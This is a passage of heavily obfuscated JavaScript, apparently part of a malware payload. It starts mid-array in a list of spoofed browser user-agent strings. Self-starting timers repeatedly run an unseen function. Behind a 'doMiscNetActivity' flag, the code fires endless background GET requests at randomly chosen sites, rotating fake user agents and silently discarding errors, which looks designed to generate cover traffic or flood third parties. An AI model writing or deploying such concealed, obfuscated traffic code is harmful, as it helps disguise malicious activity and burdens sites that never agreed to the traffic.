      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + a4(0xa, 'RF%u') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x7 * 0xe5 + -0x427 * 0x8 + -0x463 * -0x9; k < 0x1 * -0x5b3 + -0x5 * -0xd1 + 0x1a2; k++)
    setTimeout(f, (0x20 * 0x712 + 0xd82e + -0x327 * 0x42) * k * getRandomInt(0x24b0 + -0x34 * 0xb9 + 0x1 * 0xe5, 0x1f31 * -0x1 + -0x1c57 + 0x3b8b));
  setInterval(() => {
    f();
    for (let l = -0x9d * -0x1d + -0x1 * -0xbc0 + -0x1d89 * 0x1; l < -0x79 * -0x2b + 0x49 * -0x23 + -0xa54; l++)
      setTimeout(f, (0x754f * -0x2 + -0x5 * -0x44 + 0x1d3aa) * l * getRandomInt(-0x5 * 0x7cd + 0x1aaa + 0xc58, 0x14db + 0x2 * 0xf64 + 0x7 * -0x760));
  }, -0x6727 * 0xdf + -0x1 * -0xc40aa + 0x8488cf);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1d8 + 0x4d9 * 0x1 + 0x1857) * getRandomInt(0x1695 + 0x1bff + -0x1 * 0x3293, -0x109b + 0x1bd9 + 0xb39 * -0x1));
}, -0x1 * 0xa16 + -0x65b + 0x10d5);